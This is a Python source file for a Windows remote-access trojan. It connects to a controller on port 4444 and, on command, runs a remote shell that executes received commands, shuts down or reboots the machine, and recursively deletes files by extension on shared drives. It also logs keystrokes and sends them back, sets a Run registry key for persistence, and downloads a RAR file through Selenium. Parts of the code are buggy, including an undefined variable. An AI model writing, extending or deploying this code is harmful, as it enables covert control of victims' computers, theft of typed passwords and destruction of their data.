from socket import *
import subprocess as sub
from winreg import *
import pyttsx3
from cryptography.fernet import Fernet
import copy
from pynput import keyboard
from winsound import Beep
import winreg as reg
import requests
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from colorama import Fore , Style
from password import username , password
import random
import os
import time
s = socket(2,1)
s.connect(("127.0.0.1",4444))
print("Connected To Port")
print("______________________________")

def choice(data):

    if data == "1":
        while True:
            data1 = s.recv(102456).decode()
            cmd = sub.check_output(data1, shell=True).decode()
            s.send(str(cmd).encode())

    elif data == "2":
        if p==1:
            time.sleep(10)
            sub.check_output("SHUTDOWN /s", shell=True)
        if p==2:
            time.sleep(10)
            sub.check_output("SHUTDOWN /r", shell=True)
        else:
            data="cancel"
            s.send(data.encode())

    elif data[0] == "3":

        drive = ["A:","B:","C:","D:","E:","F:","G:","H:","Z:","N:"]
        sys_drive=[]
        cmd = sub.check_output("net share", shell=True).decode()
        for i in drive:
            if i in str(cmd):
                sys_drive.append(i)

        for i in sys_drive:
            try:
                sub.check_output("del /S "+i+"\\*."+p, shell=True)
                s.send("Win".encode())
            except:
                s.send("Lose".encode())

    elif data == "4":


        def key_listener():
            with keyboard.Listener(on_press=key_log) as lstn:
                lstn.join()

        def key_log(key):

            if type(key) == keyboard._win32.KeyCode:
                k = key.char

            else:
                k = ' ' + str(key) + ' '

            data = str(k)
            s.send(data)

        key_listener()
        def addToReg():
            key = reg.OpenKey(reg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0,
                              reg.KEY_ALL_ACCESS)
            reg.SetValueEx(key, "any_name", 0, reg.REG_SZ, __file__)
            reg.CloseKey(key)

        addToReg()
        
    elif data == "5":

        chrome_options = webdriver.ChromeOptions()
        chrome_options.add_argument("D:\selenium")
        addresss = os.path.abspath(__file__)
        addresss = os.path.dirname(addresss)
        addresss = os.path.join(addresss, 'chromedriver.exe')

        driver = webdriver.Chrome(executable_path=addresss, options=chrome_options)
        driver.maximize_window()
        driver.get('https://s19.picofile.com/file/8440576242/1.rar.html')

        time.sleep(3)
        a_1 = driver.find_element_by_xpath('//*[@id="downloadLink"]')
        a_1.click()
        data="succesfull"
        s.send(data)






        



data = s.recv(1024).decode()
choice(data)
    


